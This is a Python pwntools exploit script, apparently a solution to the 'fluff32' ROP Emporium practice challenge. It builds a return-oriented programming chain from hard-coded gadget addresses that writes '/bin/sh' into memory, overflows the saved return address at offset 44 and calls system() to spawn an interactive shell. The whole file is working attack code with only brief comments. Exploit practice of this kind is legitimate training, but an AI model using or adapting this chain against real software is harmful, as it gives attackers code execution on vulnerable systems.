from pwn import *

system_plt = 0x8048430
data_seg   = 0x804a050

def write_to_addr(data, address):
    #Put address in ecx
    seq = ''
    seq += p32(0x08048671) # xor edx,edx; pop esi; mov ebp,0xcafebabe; ret
    seq += 'junk'
    seq += p32(0x080483e1) # pop ebx ; ret
    seq += p32(address)
    seq += p32(0x0804867b) # xor edx,ebx; pop ebp; mov edi,0xdeadbabe; ret 
    seq += 'junk'
    seq += p32(0x08048689) # xchg edx,ecx; pop ebp; mov edx,0xdefaced0; ret  
    seq += 'junk'
    
    # Put data in edx
    seq += p32(0x08048671) # xor edx,edx; pop esi; mov ebp,0xcafebabe; ret
    seq += 'junk'
    seq += p32(0x080483e1) # pop ebx ; ret
    seq += data
    seq += p32(0x0804867b) # xor edx,ebx; pop ebp; mov edi,0xdeadbabe; ret 
    seq += 'junk'

    # Write edx to [ecx]
    seq += p32(0x08048693) # mov DWORD PTR [ecx],edx 
    seq += 'junk'          # pop ebp
    seq += p32(0)          # pop ebx; xor BYTE PTR [ecx],bl; ret
    
    return seq

# RIP offset is at 44
rop = "A" * 44

# Write data
rop += write_to_addr('/bin', data_seg)
rop += write_to_addr('/sh\x00', data_seg + 4)

# Call shell
rop += p32(system_plt)
rop += 'junk'
rop += p32(data_seg)

# Start process and send rop chain
e = process('fluff32')
print e.recv()
e.sendline(rop)
e.interactive()
